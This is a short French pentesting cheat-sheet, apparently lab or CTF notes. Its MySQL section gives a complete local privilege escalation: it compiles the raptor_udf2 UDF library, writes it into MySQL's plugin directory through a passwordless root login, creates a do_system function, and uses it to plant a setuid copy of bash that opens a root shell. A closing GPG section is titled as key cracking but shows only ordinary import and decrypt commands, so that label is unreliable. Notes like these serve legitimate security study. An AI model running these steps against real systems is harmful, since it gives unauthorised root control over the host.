# Service Exploit

## MySQL

Le service MySQL s'exécute en tant que root et l'utilisateur « root » du service n'a pas de mot de passe attribué.

Nous pouvons utiliser un [exploit](https://www.exploit-db.com/exploits/1518) qui tire parti des fonctions définies par l'utilisateur (UDF) pour exécuter des commandes système en tant que root via le service MySQL.

```sh
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sh
mysql -u root
```

```sql
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/[FULL_PATH]/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';
```

```sh
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

```sh
exit
```

```sh
/tmp/rootbash -p
```

## GPG

Casser une cle GPG

```sh
gpg --import key.asc [.key]
gpg --decrypt key.pgp [.gpg]
```
